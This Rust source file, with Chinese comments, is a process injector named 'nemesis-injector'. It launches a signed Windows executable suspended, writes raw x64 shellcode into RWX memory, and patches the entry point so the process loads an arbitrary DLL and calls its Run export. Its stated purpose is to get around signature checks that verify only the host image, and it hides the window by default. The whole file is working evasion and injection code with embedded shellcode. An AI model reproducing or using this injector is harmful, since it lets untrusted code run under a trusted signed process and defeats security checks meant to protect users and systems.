//! nemesis-injector —— 挂起启动 + EP 注入（同步接管版）
//!
//! 用途：在已签名进程（如 SbieCtrl.exe）的上下文里跑自己的 DLL，
//! 绕过"主映像签名校验"类检查（校验只验宿主 exe，不验注入的 DLL）。
//!
//! 流程（移植自 C:\Lenovo\launcher.c）：
//! CREATE_SUSPENDED → 读 PEB.ImageBase + PE OEP → 远程分配 RWX → 写 shellcode
//! → 把 OEP 首 12 字节改成 `mov rax,shellcode;jmp rax` → ResumeThread。
//! 主线程到 EP 跳进 shellcode：LoadLibraryA(dll) → GetProcAddress("Run") → call Run()。
//! DLL 的 Run() 内部 ExitProcess 收尾，宿主原流程不执行。
//!
//! 仅 Windows（x64）。非 Windows 编译为 stub 保 cargo check 绿。

#![cfg(windows)]

use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_PROTECTION_FLAGS,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, IsWow64Process, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

use thiserror::Error;

const CREATE_SUSPENDED: u32 = 0x00000004;
const PEB_IMAGEBASE_OFFSET: usize = 0x10;

#[derive(Error, Debug)]
pub enum InjectError {
    #[error("CreateProcess 失败: {0}")]
    CreateProcess(u32),
    #[error("NtQueryInformationProcess 失败")]
    QueryInfo,
    #[error("读 PEB.ImageBase 失败")]
    ReadPeb,
    #[error("读 PE 头失败")]
    ReadPe,
    #[error("目标进程是 WOW64(x86)，本注入器仅支持 x64")]
    Wow64,
    #[error("解析 kernel32 API 失败")]
    ResolveApi,
    #[error("VirtualAllocEx 失败: {0}")]
    Alloc(u32),
    #[error("WriteProcessMemory(shellcode) 失败: {0}")]
    WriteShell(u32),
    #[error("VirtualProtectEx(EP) 失败: {0}")]
    ProtectEp(u32),
    #[error("WriteProcessMemory(EP) 失败: {0}")]
    WriteEp(u32),
}

// ---------------------------------------------------------------------------
// x64 shellcode（与 launcher.c 完全一致）。运行时补 8 个绝对地址。
// 对齐：and rsp,-16; sub rsp,0x20 保证 call 时 RSP ≡ 0 mod 16。
// ---------------------------------------------------------------------------
const OFF_DLLPATH: usize = 0x0A;
const OFF_LOADLIB: usize = 0x14;
const OFF_NAME: usize = 0x23;
const OFF_GPA: usize = 0x2D;
const SHCODE_SIZE: usize = 0x40;
const OFF_DATA_DLLPATH: usize = 0x100;
const OFF_DATA_NAME: usize = 0x200;

const SHELLCODE: [u8; SHCODE_SIZE] = [
    0x48,0x83,0xE4,0xF0,                              /* 00 and rsp,-16      */
    0x48,0x83,0xEC,0x20,                              /* 04 sub rsp,0x20     */
    0x48,0xB9, 0,0,0,0,0,0,0,0,                       /* 08 mov rcx, dllpath */
    0x48,0xB8, 0,0,0,0,0,0,0,0,                       /* 12 mov rax, LoadLib */
    0xFF,0xD0,                                        /* 1C call rax         */
    0x48,0x89,0xC1,                                   /* 1E mov rcx, rax     */
    0x48,0xBA, 0,0,0,0,0,0,0,0,                       /* 21 mov rdx, "Run"   */
    0x48,0xB8, 0,0,0,0,0,0,0,0,                       /* 2B mov rax, GPA     */
    0xFF,0xD0,                                        /* 35 call rax         */
    0x48,0x85,0xC0,                                   /* 37 test rax,rax     */
    0x74,0x02,                                        /* 3A jz +2 -> 0x3E    */
    0xFF,0xD0,                                        /* 3C call rax (Run)   */
    0xEB,0xFE,                                        /* 3E jmp self (spin)  */
];

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ProcessBasicInfo {
    exit_status: usize,
    peb_base_address: usize,
    affinity_mask: usize,
    base_priority: usize,
    unique_process_id: usize,
    reserved3: usize,
}

unsafe extern "system" {
    fn NtQueryInformationProcess(
        process_handle: HANDLE,
        info_class: u32,
        info: *mut std::ffi::c_void,
        info_len: u32,
        ret_len: *mut u32,
    ) -> i32;
    fn ReadProcessMemory(
        h_process: HANDLE,
        lp_base_address: *const std::ffi::c_void,
        lp_buffer: *mut std::ffi::c_void,
        n_size: usize,
        lp_number_of_bytes_read: *mut usize,
    ) -> i32;
}

fn put64(p: &mut [u8], off: usize, v: u64) {
    p[off..off + 8].copy_from_slice(&v.to_le_bytes());
}

/// 读远程进程的 OEP（ImageBase + PE AddressOfEntryPoint）。
fn get_remote_oep(hp: HANDLE) -> Result<u64, InjectError> {
    unsafe {
    let mut pbi = ProcessBasicInfo::default();
    let mut ret: u32 = 0;
    if NtQueryInformationProcess(hp, 0, &mut pbi as *mut _ as *mut _, std::mem::size_of::<ProcessBasicInfo>() as u32, &mut ret) < 0
        || pbi.peb_base_address == 0
    {
        return Err(InjectError::QueryInfo);
    }
    let mut image_base: u64 = 0;
    let mut done: usize = 0;
    let peb_ib = (pbi.peb_base_address + PEB_IMAGEBASE_OFFSET) as *const _;
    if ReadProcessMemory(hp, peb_ib, &mut image_base as *mut _ as *mut _, 8, &mut done) == 0 || image_base == 0 {
        return Err(InjectError::ReadPeb);
    }
    let mut hdr = [0u8; 0x40];
    if ReadProcessMemory(hp, image_base as *const _, hdr.as_mut_ptr() as *mut _, 0x40, &mut done) == 0 {
        return Err(InjectError::ReadPe);
    }
    let e_lfanew = u32::from_le_bytes(hdr[0x3C..0x40].try_into().unwrap()) as u64;
    let mut nt = [0u8; 0x40];
    if ReadProcessMemory(hp, (image_base + e_lfanew) as *const _, nt.as_mut_ptr() as *mut _, 0x40, &mut done) == 0 {
        return Err(InjectError::ReadPe);
    }
    // NT 头: 4 sig + 0x14 FileHeader → OptionalHeader；AddressOfEntryPoint 在 OptionalHeader +0x10
    let aoep = u32::from_le_bytes(nt[0x18 + 0x10..0x18 + 0x14].try_into().unwrap()) as u64;
    Ok(image_base + aoep)
    }
}

/// 挂起启动 + EP 注入。
///
/// - `target_exe`：宿主 exe 全路径（已签名的目标，如 SbieCtrl.exe）
/// - `dll_path`：要注入的 DLL 全路径（DLL 需导出 `Run` —— extern "C" 无参无返回）
/// - `creation_flags_extra`：额外 CreateProcess 标志（默认加 CREATE_NO_WINDOW，避免弹窗）
///
/// 返回进程句柄 + 主线程句柄。调用方负责 wait / close。
pub fn launch_and_inject(
    target_exe: &str,
    dll_path: &str,
    creation_flags_extra: u32,
) -> Result<(HANDLE, HANDLE), InjectError> {
    launch_and_inject_with_env(target_exe, dll_path, creation_flags_extra, &[])
}

/// 同 [`launch_and_inject`]，并给宿主进程注入额外环境变量
/// （注入的 DLL 经 GetEnvironmentVariable 读取配置）。
pub fn launch_and_inject_with_env(
    target_exe: &str,
    dll_path: &str,
    creation_flags_extra: u32,
    env: &[(&str, &str)],
) -> Result<(HANDLE, HANDLE), InjectError> {
    unsafe {
        // CREATE_SUSPENDED + 调用方额外标志（CREATE_NO_WINDOW=0x08000000 默认加，防弹窗）
        let flags = CREATE_SUSPENDED | creation_flags_extra | 0x08000000;
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // 命令行（ANSI，带引号）
        let mut cmd: Vec<u8> = Vec::new();
        cmd.push(b'"');
        cmd.extend_from_slice(target_exe.as_bytes());
        cmd.push(b'"');
        cmd.push(0);

        // Build the ANSI environment block: inherit the parent env (lossily
        // encoded to the ANSI code page — all eval paths are ASCII), then
        // apply the caller's overrides. The injected DLL reads env via
        // GetEnvironmentVariableA, which matches this encoding exactly.
        let mut vars: Vec<String> = std::env::vars()
            .map(|(k, v)| format!("{k}={v}"))
            .collect();
        for (k, v) in env {
            let needle = format!("{k}=");
            vars.retain(|s| !s.starts_with(&needle));
            vars.push(format!("{k}={v}"));
        }
        vars.sort();
        let mut env_block: Vec<u8> = Vec::new();
        for s in &vars {
            // Lossy ANSI encode: non-ASCII chars become '?' rather than
            // corrupting the block with raw UTF-8 bytes.
            for b in s.chars().map(|c| if c.is_ascii() { c as u8 } else { b'?' }) {
                env_block.push(b);
            }
            env_block.push(0);
        }
        env_block.push(0); // terminating double-NUL

        if CreateProcessA(
            std::ptr::null(),
            cmd.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            flags,
            env_block.as_ptr() as *const _,
            std::ptr::null(),
            &mut si,
            &mut pi,
        ) == 0
        {
            return Err(InjectError::CreateProcess(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32));
        }

        let hp = pi.hProcess;
        let ht = pi.hThread;

        // WOW64 检查（仅 x64）
        let mut wow64: i32 = 0;
        if IsWow64Process(hp, &mut wow64) != 0 && wow64 != 0 {
            CloseHandle(ht);
            CloseHandle(hp);
            return Err(InjectError::Wow64);
        }

        let result = inject_ep_hijack(hp, dll_path);

        // 无论注入成败都 Resume（注入失败则宿主正常跑，至少不留挂起进程）
        if ResumeThread(ht) == u32::MAX {
            tracing::warn!("ResumeThread 失败，进程可能仍挂起");
        }

        match result {
            Ok(()) => Ok((hp, ht)),
            Err(e) => {
                CloseHandle(ht);
                CloseHandle(hp);
                Err(e)
            }
        }
    }
}

fn inject_ep_hijack(hp: HANDLE, dll_path: &str) -> Result<(), InjectError> {
    unsafe {
    let oep = get_remote_oep(hp)?;
    tracing::info!("OEP = 0x{:X}", oep);

    let base = VirtualAllocEx(hp, std::ptr::null(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if base.is_null() {
        return Err(InjectError::Alloc(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32));
    }
    let base_addr = base as u64;
    tracing::info!("remote block = 0x{:X}", base_addr);

    let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    if k32.is_null() {
        return Err(InjectError::ResolveApi);
    }
    let load_lib_addr = GetProcAddress(k32, b"LoadLibraryA\0".as_ptr())
        .ok_or(InjectError::ResolveApi)? as usize as u64;
    let gpa_addr = GetProcAddress(k32, b"GetProcAddress\0".as_ptr())
        .ok_or(InjectError::ResolveApi)? as usize as u64;

    let mut sc = [0u8; 0x1000];
    sc[..SHCODE_SIZE].copy_from_slice(&SHELLCODE);
    put64(&mut sc, OFF_DLLPATH, base_addr + OFF_DATA_DLLPATH as u64);
    put64(&mut sc, OFF_LOADLIB, load_lib_addr);
    put64(&mut sc, OFF_NAME, base_addr + OFF_DATA_NAME as u64);
    put64(&mut sc, OFF_GPA, gpa_addr);

    // dllpath 写到 OFF_DATA_DLLPATH
    let dp = &mut sc[OFF_DATA_DLLPATH..];
    let bytes = dll_path.as_bytes();
    let n = bytes.len().min(dp.len() - 1);
    dp[..n].copy_from_slice(&bytes[..n]);
    dp[n] = 0;
    // "Run\0" 写到 OFF_DATA_NAME
    sc[OFF_DATA_NAME..OFF_DATA_NAME + 4].copy_from_slice(b"Run\0");

    let mut done: usize = 0;
    if WriteProcessMemory(hp, base, sc.as_mut_ptr() as *mut _, 0x1000, &mut done) == 0 {
        return Err(InjectError::WriteShell(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32));
    }

    // EP 首 12 字节改成 mov rax,base; jmp rax
    let mut old_prot: PAGE_PROTECTION_FLAGS = 0;
    if VirtualProtectEx(hp, oep as *const _, 16, PAGE_EXECUTE_READWRITE, &mut old_prot) == 0 {
        return Err(InjectError::ProtectEp(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32));
    }
    let mut jmp = [0u8; 12];
    jmp[0] = 0x48;
    jmp[1] = 0xB8;
    jmp[2..10].copy_from_slice(&base_addr.to_le_bytes());
    jmp[10] = 0xFF;
    jmp[11] = 0xE0;
    if WriteProcessMemory(hp, oep as *const _, jmp.as_mut_ptr() as *mut _, 12, &mut done) == 0 {
        return Err(InjectError::WriteEp(std::io::Error::last_os_error().raw_os_error().unwrap_or(0) as u32));
    }
    // FlushInstructionCache 非必需（WriteProcessMemory 已同步缓存），省略。

    tracing::info!("EP hijack installed: LoadLibrary -> GetProcAddress(\"Run\") -> call Run");
    Ok(())
    }
}

// 抑制未使用 import 说明：LoadLibraryA/GetProcAddress 在 shellcode 里间接调用，
// 注入器自身只取它们的地址（GetModuleHandleA + GetProcAddress），不直接 import。

/// 关闭句柄对（便利函数）。
pub fn close_handles(hp: HANDLE, ht: HANDLE) {
    unsafe {
        CloseHandle(ht);
        CloseHandle(hp);
    }
}

/// 等待进程退出（阻塞），返回退出码。
pub fn wait_and_get_exit(hp: HANDLE) -> Option<u32> {
    use windows_sys::Win32::System::Threading::{GetExitCodeProcess, WaitForSingleObject, INFINITE};
    unsafe {
        if WaitForSingleObject(hp, INFINITE) != 0 {
            return None;
        }
        let mut code: u32 = 0;
        if GetExitCodeProcess(hp, &mut code) == 0 {
            return None;
        }
        Some(code)
    }
}
